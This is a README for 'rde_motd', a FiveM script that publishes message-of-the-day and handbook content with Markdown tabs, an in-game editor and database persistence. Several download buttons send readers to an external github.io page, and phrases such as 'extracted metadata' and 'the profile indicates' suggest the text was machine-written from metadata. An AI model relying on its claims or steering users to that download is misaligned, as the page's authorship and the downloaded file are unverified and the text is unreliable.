# rde_motd v1.0.0 - Game Script Utility 2026

> **A FiveM utility for publishing MOTD content and server handbooks, with editable tabs, admin-controlled updates, and server-side documentation delivery.** It is designed around Markdown content, an in-game editor, and synchronized live updates.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrewbennett93/rde-motd-script-utility?style=flat-square)](https://github.com/andrewbennett93/rde-motd-script-utility)

---

<p align="center">
  <a href="https://andrewbennett93.github.io/rde-motd-script-utility/">
    <img src="https://img.shields.io/badge/Download-rde_motd%20Script-brightgreen?style=for-the-badge" alt="Download rde_motd Script">
  </a>
</p>

> **[Download rde_motd](https://andrewbennett93.github.io/rde-motd-script-utility/)**

---

[Download Latest Build](https://andrewbennett93.github.io/rde-motd-script-utility/)

---

## What it does

rde_motd is a FiveM server script built to present a message of the day and handbook-style information through a clean, editable content system. Its workflow is centered on Markdown, which makes it suitable for rules, notes, guides, and other in-game documentation that needs to remain easy to update.

It also ships with an in-game WYSIWYG editor and an admin panel flow, so content can be maintained without leaving the server environment. Publishing can happen without a restart, and statebag-synced updates help keep what players see aligned across clients. Version-aware reshow handling and multilingual support complete the setup for servers that need repeated visibility and localized presentation.

## Features

- Six editable tabs for splitting MOTD and handbook material into sections
- In-game WYSIWYG editor for making content changes directly
- Markdown-based content management for structured text workflows
- oxmysql-backed persistence for storing data in a database
- Statebag-synced updates for pushing live content changes
- Zero-restart publishing for sending updates without restarting
- Version-based reshow behavior to bring updated content back into view
- Multilingual support for localized server documentation

## Installation

1. Copy the `rde_motd-server-script` resource into your FiveM resources directory.
2. Make sure the required dependencies are present in your server setup, including ox_core, ox_lib, and oxmysql where they are used.
3. Add the resource to your server startup configuration.
4. Use the admin panel or the in-game editor to create and manage Markdown content.

Example resource start entry:

ensure rde_motd-server-script

## Configuration Options

| Setting | Purpose | Notes |
| --- | --- | --- |
| Tabs | Organize content into six sections | Useful for rules, guides, announcements, and notes |
| Editor mode | Edit content in the in-game WYSIWYG interface | Best for quick updates |
| Markdown source | Store and format handbook text in Markdown | Keeps content structured and portable |
| Persistence | Save content to the database | Requires your database configuration |
| Statebag sync | Broadcast content updates to connected clients | Supports live refresh behavior |
| Version reshow | Reopen content when the version changes | Helps surface updated information |
| Localization | Present content in multiple languages | Useful for multilingual communities |

## Compatibility Notes

rde_motd is intended for FiveM server environments and is meant to operate with the script stack listed in the extracted metadata, including ox_core, ox_lib, and oxmysql where configured. Since it relies on server-side resources and database setup, results can differ depending on framework structure, editor permissions, and resource ordering.

Known limitations:
- Requires proper server resource installation and configuration
- Database-backed features depend on a working oxmysql setup
- Localization depends on the language data you provide
- Live update behavior assumes the relevant sync path is active in your server

## Common Questions

### How do I install it?
Place the resource folder in your FiveM resources directory, confirm the dependencies, and add an `ensure` entry for it in `server.cfg`.

### Can I edit content in-game?
Yes. The script includes an in-game WYSIWYG editor for updating MOTD and handbook text without switching tools.

### Does it support Markdown?
Yes. Markdown-driven content management is part of the workflow, so you can maintain structured documentation in a familiar format.

### Do updates require a restart?
The script supports zero-restart publishing, so content can be pushed live without restarting the server resource.

### How are changes stored?
The profile indicates database-backed persistence, so content is saved through your configured database layer.

### Can I customize the tabs and wording?
Yes. The script is designed around editable tabs and localized content, so you can adapt it to your server's structure and language needs.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
